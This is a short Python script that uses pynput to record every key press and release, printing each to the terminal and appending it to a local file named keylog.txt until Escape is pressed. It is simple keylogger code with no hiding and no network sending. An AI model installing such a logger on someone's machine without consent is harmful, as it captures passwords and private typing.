from pynput import keyboard

def on_press(key):
   try:
      print(f"Alphanumeric key '{key.char}' pressed") # Print to terminal
      with open("keylog.txt", "a") as f:
         f.write(f"Alphanumeric key '{key.char}' pressed\n")
   except AttributeError:
      print(f"Special key '{key}' pressed") # Print to terminal
      with open("keylog.txt", "a") as f:
        f.write(f"Special key '{key}' pressed\n")

def on_release(key):
   print(f"'{key}' released") 
#print to terminal
   with open("keylog.txt", "a") as f:
      f.write(f"'{key}' released\n")

   if key == keyboard.Key.esc:
    # Stop listener
      return False

#Collect events until released
with keyboard.Listener(
on_press=on_press,
on_release=on_release) as listener:
    listener.join() 